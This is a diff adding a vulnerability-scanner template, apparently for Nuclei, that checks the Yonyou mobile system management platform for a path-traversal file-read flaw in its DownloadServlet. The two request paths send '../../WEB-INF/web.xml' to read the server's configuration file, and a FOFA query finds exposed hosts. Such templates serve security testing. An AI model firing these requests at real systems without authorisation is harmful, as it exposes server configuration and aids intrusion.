@@ -1,0 +1,27 @@
+id: yonyou-mobile-DownloadServlet-fileread
+
+info:
+  name: 用友移动系统管理平台 com.yonyou.maportal.bs.padplugin.controller.DownloadServlet - fileread
+  author: zhxknb1
+  severity: high
+  description:
+  reference:
+    - todo
+  metadata:
+    verified: true
+    fofa-query: app="用友-移动系统管理"
+  tags: yonyou,mobile,fileread,oa
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/servlet/~maportal/;/com.yonyou.maportal.bs.padplugin.controller.DownloadServlet?filename=../../WEB-INF/web.xml"
+      - "{{BaseURL}}/servlet/~maportal/com.yonyou.maportal.bs.padplugin.controller.DownloadServlet?filename=../../WEB-INF/web.xml"
+
+    stop-at-first-match: true
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,"filter-name","servlet-name")
+        condition: and
